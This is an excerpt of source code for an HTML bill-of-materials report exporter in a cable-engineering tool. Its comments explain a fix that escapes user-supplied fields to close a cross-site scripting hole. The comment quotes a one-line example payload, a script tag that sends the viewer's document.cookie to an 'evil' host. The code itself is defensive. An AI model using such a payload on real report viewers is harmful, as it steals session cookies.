...
/**
 * F-10 FIX (Engineering Review): escape all user-supplied strings before
 * interpolating them into HTML. The previous `exportToPdfReport` directly
 * embedded `data.projectName`, `data.clientName`, `data.engineerName`, and
 * every cable/device field into the HTML template via `${...}` — a real XSS
 * vector. A malicious or accidentally-formatted project name like
 *   <script>document.location='https://evil/?c='+document.cookie</script>
 * would be executed when the report was opened in the browser / print preview.
 *
 * `escapeHtml` replaces the 5 HTML-significant characters with their entity
 * references, neutralizing any tag/script injection. Numeric fields are
 * coerced through `Number()` so a string like "1; </td><script>..." cannot
 * escape its cell.
 *
 * NOTE: This fix does NOT replace the underlying HTML+window.print() approach
 * with a real PDF library (jsPDF/pdf-lib). That work is tracked as F-10b and
 * is a larger change. The XSS fix is a prerequisite — even with jsPDF, user
 ...
 *
 * F-10 FIX: every `${...}` interpolation of user data now goes through
 * `escapeHtml` or `escapeNumber`. The static HTML skeleton (tags, attributes,
...
<html>
<head>
  <title>BOM Report - ${escapeHtml(data.projectName)}</title>
  <style>
...
<body>
  ...
  <div class="header-info">
    <div>
      ...
      <strong>Client:</strong> ${escapeHtml(data.clientName)}
    </div>
    <div style="text-align: right;">
      <strong>Engineer:</strong> ${escapeHtml(data.engineerName)}<br>
  ...
  <div class="summary">
    <div class="summary-item">
      ...
      <div class="summary-value">${escapeNumber(data.summary.totalCables)}</div>
    </div>
    <div class="summary-item">
      <div class="summary-label">Total Length</div>
      <div class="summary-value">${escapeNumber(data.summary.totalCableLength)} m</div>
    </div>
    <div class="summary-item">
      <div class="summary-label">Total Devices</div>
      <div class="summary-value">${escapeNumber(data.summary.totalDevices)}</div>
    </div>
    <div class="summary-item">
      <div class="summary-label">Est. Weight</div>
      <div class="summary-value">${escapeNumber(data.summary.estimatedWeight)} kg</div>
    </div>
    <div class="summary-item">
      <div class="summary-label">Est. Cost</div>
      <div class="summary-value">&euro;${escapeNumber(data.summary.estimatedCost)}</div>
    </div>
  </div>
    ...
    <tbody>
      ${data.cableSchedule
        ...
        <tr>
          ...
          <td>${escapeNumber(c.length)}</td>
          <td>${escapeHtml(c.crossSection)}</td>
    ...
    <tbody>
      ${data.deviceCounts
        ...
        <tr>
          ...
          <td>${escapeNumber(d.count)}</td>
          <td>${escapeNumber(d.avgPower)}</td>
          <td>${escapeNumber(d.totalPower)}</td>
